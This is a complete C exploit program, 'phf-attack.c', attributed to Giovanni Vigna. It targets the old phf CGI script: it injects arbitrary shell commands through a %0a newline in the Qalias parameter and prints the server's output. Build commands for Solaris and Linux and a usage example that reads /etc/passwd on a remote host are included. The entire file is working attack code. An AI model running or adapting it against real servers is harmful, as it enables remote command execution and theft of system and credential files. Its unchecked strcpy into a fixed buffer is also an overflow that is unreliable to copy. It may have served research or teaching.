/*   
     phf-attack.c
     Giovanni Vigna
# SOLARIS
     gcc phf-attack.c -o phf-attack-solaris -lsocket -lnsl
# LINUX
     gcc phf-attack.c -o phf-attack-linux
# RUN
     ./phf-attack-<arch> foo.bar.com 80 cmd1 cmd2...
e.g.,
     ./phf-attack-linux linuxserv 80 cat /etc/passwd
*/
#include <sys/stat.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/times.h>
#ifdef LINUX
#include <sys/time.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/signal.h>
#include <arpa/inet.h>
#include <netdb.h>

void usage();
int open_socket_connection(char *, int);
char *progname;

int main (int argc, char *argv[]) {
  char *hostname;
  int port;
  int i;
  int socket;
  char phf_request[2048];
  char phf_header[] = "GET /cgi-bin/phf?Qalias=x%0a";
  char *phf_trail;
  int num;
  char inbuf[65535];
  
  progname = argv[0];
  if (argc < 3) {
    usage();
    exit(1);
  }

  hostname = argv[1];
  port = atoi(argv[2]);
  
  /* Copies the header */
  strcpy(phf_request, phf_header);

  phf_trail = phf_request + strlen(phf_header);

  for (i = 3; i < argc; i++) {
    strcpy(phf_trail, argv[i]);
    phf_trail += strlen(argv[i]);
    strcpy(phf_trail, "%20");
    phf_trail += strlen("%20");
  }
  phf_trail[0] = '\n';
  phf_trail[1] = '\0';

  fprintf(stderr, "host: %s port: %d string: %s\n", hostname, port, phf_request);

  socket = open_socket_connection(hostname, port);
  if (socket < 0) {
    fprintf(stderr, "%s: can't open connection to %s\n", progname, hostname);
    exit(1);
  }
  write(socket, phf_request, strlen(phf_request));

  while((num = read(socket, inbuf, 65535)) !=0) {
    write(1, inbuf, num);
  }
  close (socket);   

  return 0;
}



void usage() {
  printf("%s host port command...\n", progname);
}


int open_socket_connection(char *hostname, int port) {
  int sock_fd;
  struct sockaddr_in server_addr;
  struct hostent *host;
  int result;
 
  sock_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (sock_fd == -1) {
    perror("socket");
    return -1;
  }

  host = gethostbyname(hostname);
  if (host == NULL) {
    perror("gethostbyname");
    return -1;
  }

  bzero((char *) &server_addr, sizeof(server_addr));
  bcopy((char *)host->h_addr, (char *)&server_addr.sin_addr, host->h_length);
  server_addr.sin_family = host->h_addrtype;

  server_addr.sin_port = htons((u_short) port);
 
  result = connect(sock_fd, (struct sockaddr *) &server_addr, 
                   sizeof(server_addr));
 
  if (result == -1) {
    perror("connect");
    return -1;
  }
  return sock_fd;
}

